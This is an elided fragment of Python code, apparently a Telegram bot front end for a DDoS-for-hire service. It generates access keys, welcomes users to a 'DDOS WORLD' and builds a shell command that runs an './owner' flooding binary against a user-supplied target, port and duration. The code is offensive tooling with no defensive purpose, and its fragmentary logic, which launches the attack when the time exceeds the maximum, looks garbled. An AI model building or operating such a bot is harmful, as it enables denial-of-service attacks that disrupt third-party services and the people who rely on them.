...
def create_random_key():
    key = "SHIVAxHEADSHOT-" + ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(10))
...
def start_command(message):
    ...
    bot.reply_to(message, "𝗪𝗘𝗟𝗖𝗢𝗠𝗘 𝗧𝗢 𝐒𝐇𝐈𝐕𝐀𝐱𝐇𝐄𝐀𝐃𝐒𝐇𝐎𝐓 𝐃𝐃𝐎𝐒 𝐖𝐎𝐑𝐋𝐃!", reply_markup=markup)
    ...
    if len(details) == 3:
        ...
        try:
            ...
            if attack_time > MAX_ATTACK_TIME:
                ...
                full_command = f"./owner {target} {port} {attack_time} 999 999"  # ✅ Correct variable name
                ...
                response = (
                    ...
                    f"𝗔𝘁𝘁𝗮𝗰𝗸𝗲𝗿: SBR KR ATTACK CHLRA"
                )
